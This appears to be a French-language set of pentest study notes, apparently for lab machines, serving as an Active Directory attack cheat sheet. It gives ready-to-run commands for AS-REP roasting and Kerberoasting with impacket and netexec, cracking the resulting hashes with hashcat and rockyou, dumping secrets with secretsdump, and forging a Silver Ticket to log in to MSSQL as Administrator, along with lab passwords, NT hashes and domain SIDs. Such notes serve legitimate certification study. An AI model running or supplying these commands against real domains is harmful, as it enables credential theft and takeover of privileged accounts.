

## AS-REP 
Besoin de compte  n'ayant pas de pré-authentification enregistré sur le DC

```
Utilisateur AD
      ↓
userAccountControl
      ↓
UF_DONT_REQUIRE_PREAUTH
      ↓
4194304
      ↓
AS-REP Roastable
      ↓
GetNPUsers / requête LDAP
      ↓
$krb5asrep$23$...
```

```bash 
# Enumération et découverte
netexec ldap <DC_IP> -u '' -p '' --users
netexec ldap sequel.htb -u '' -p '' --query "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
ldapsearch -x -H ldap://<DC_IP> -b "DC=sequel,DC=htb" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName userAccountControl
ldapsearch -x -H ldap://<DC_IP> -D "" -w "" -b "DC=sequel,DC=htb" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName userAccountControl

# Obtenir la liste des users meme quand tu n'as **aucun mot de passe**,
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass

# Mettre dans un fichier au format pour hashcat
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile valid_users.txt -dc-ip 10.129.41.79 -format hashcat -outputfile hashes.aspreroast -no-pass

# Obtenir les comptes ayant retourné un AS-REP
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -request


# la sortie intéressante
$krb5asrep$23$user@DOMAIN:...

```

ref : 
```
# Obtenir les comptes ayant retourné un AS-REP
python3 targetedKerberoast.py --dc-ip 10.129.41.212 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' 
```

```bash 
hashcat -m 18200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

## SPN 
Besoin de CREDENTIAL

```
SPN trouvé
   ↓
Compte associé
   ↓
Compte utilisateur ou machine ?
   ↓
Si compte utilisateur
   ↓
Kerberoasting potentiel
   ↓
GetUserSPNs / Get-DomainSPNTicket
   ↓
TGS → hash crackable
```



```bash
# Decouvrir si des SPN existe 
netexec ldap <DC_IP> -u '<USER>' -p '<PASS>' --query "(servicePrincipalName=*)" "sAMAccountName servicePrincipalName"

### AVEC DES CREDENTIALS  ##
# Enumérer les comptes avec un SPN  
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip DC_IP
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>

## Récupérer le ticket TGS du compte
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip DC_IP -request

# Récupération du hash pour un user spécifique dans un fichier précis
impacket-GetUserSPNs delegate.vl/'A.Briggs':'P4ssw0rd1#123' -dc-ip 10.129.234.69 -request -request-user N.Thompson -outputfile N.Thompson.TGS
```


```bash 
hashcat -m 13100 -a 0 hash_file.txt /usr/share/wordlists/rockyou.txt

```



```bash
impacket-secretsdump 'administration.htb'/'ethan':'limpbizkit'@'10.129.41.21
```

## Silver Ticket
Pour créer un Silver ticket il faut : 
1. NTLM Hash du mot de passe du compte de service
2. Le SID du domaine


#### 1. Obtenir le Hash d'un mot de passe
```bash
# MDP :  Trustno1
# SID :  S-1-5-21-2330692793-3312915120-706255856
Get-LocalUser -Name $env:USERNAME | Select sid

pypykatz crypto nt Trustno1
```
#### 2. Forger un ticket pour le user Administrator
```bash
impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -nthash 69596c7aa1e8daee17f8e78870e25a5c -dc-ip 10.129.44.190 -domain breach.vl -user-id 500 Administrator
```
![alt text](https://github.com/milouzevich/CPTS/blob/main/AD/images/Pasted%20image%2020260804170018.png)
#### 3.  Se connecter avec le ticket forger 
```bash
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass -windows-auth breachdc.breach.vl
```
![alt text](https://github.com/milouzevich/CPTS/blob/main/AD/images/Pasted%20image%2020260804170104.png)
